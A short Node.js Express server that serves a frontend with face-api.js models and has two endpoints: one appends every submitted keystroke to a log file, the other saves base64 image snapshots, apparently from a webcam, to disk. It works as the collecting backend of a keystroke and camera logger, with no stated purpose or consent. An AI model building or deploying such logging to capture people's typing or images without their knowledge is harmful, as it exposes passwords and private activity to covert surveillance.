const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());              // To read JSON data
app.use(express.static(path.join(__dirname, 'public')));    // Serve frontend files from "public" folder
app.use('/models', express.static(path.join(__dirname, 'public/models'))); // Serve face-api.js models

// Save keystrokes into logs/keystrokes.txt
app.post('/log-keystroke', (req, res) => {
    const log = `${new Date().toISOString()} Key: ${req.body.key}\n`;
    fs.appendFileSync('./logs/keystrokes.txt', log);
    res.sendStatus(200);
});

// Save snapshot images into snapshots/
app.post('/save-snapshot', (req, res) => {
    const base64Data = req.body.image.replace(/^data:image\/png;base64,/, '');
    const filename = `./snapshots/snapshot_${Date.now()}.png`;
    fs.writeFileSync(filename, base64Data, 'base64');
    res.sendStatus(200);
});

// Start server on port 3000
app.listen(3000, () => console.log('✅ Server running at http://localhost:3000'));
